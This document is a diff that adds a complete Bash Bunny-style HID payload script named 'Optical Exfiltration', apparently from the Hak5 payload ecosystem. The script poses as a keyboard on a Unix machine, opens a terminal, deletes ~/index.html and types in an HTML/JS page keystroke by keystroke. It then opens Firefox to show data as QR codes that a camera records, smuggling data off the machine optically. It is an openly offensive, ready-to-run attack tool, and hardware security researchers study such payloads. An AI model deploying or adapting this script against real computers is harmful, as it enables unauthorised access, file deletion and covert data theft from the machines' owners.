@@ -1,0 +1,68 @@
+#!/bin/bash
+#
+# Title:         Optical Exfiltration
+# Author:        bg-wa
+# Version:       1.0
+# Category:      HID
+# Target:        *NIX
+# Attackmodes:   HID
+# Sources:       Hak5 2320, https://github.com/bg-wa/QRExtractor
+#
+# Quick HID only attack to write an HTML/JS file to target machine
+# and open a browser, to exfiltrate data Using QR Codes and a video
+# recording device.
+#
+# Optional html params:
+# base64: Passing a base64 string to this param will auto-start processing QR Codes.
+#
+# playback: Passing the string "finish" to this param will auto-play the results,
+#           when QR codes finish rendering.
+#
+# Example:
+# Ln65: Q STRING firefox "$target_html?playback=finish&base64=my_long_string"
+#
+# | Attack Stage        | Description                              |
+# | ------------------- | ---------------------------------------- |
+# | SETUP               | Open vi                                  |
+# | ATTACK              | Writing HTML                             |
+# | FINISH              | Browser Ready/Processing                            |
+#
+
+ATTACKMODE HID
+LED SETUP
+
+target_html=\~\/index.html
+
+RUN UNITY xterm
+Q DELAY 1000
+Q STRING rm "$target_html"
+Q ENTER
+Q DELAY 500
+Q STRING vi "$target_html"
+Q ENTER
+Q DELAY 1000
+Q STRING i
+
+LED ATTACK
+
+payload_dir=/root/udisk/payloads/$SWITCH_POSITION
+source_html=$payload_dir/index.min.html
+
+while IFS= read data
+do
+    if [ "${data}" = " " ]
+    then
+       Q SPACE
+    else
+       Q STRING "$data"
+    fi
+done < "$source_html"
+
+Q ESC
+Q STRING :x
+Q ENTER
+
+Q STRING firefox "$target_html"
+Q ENTER
+
+LED FINISH
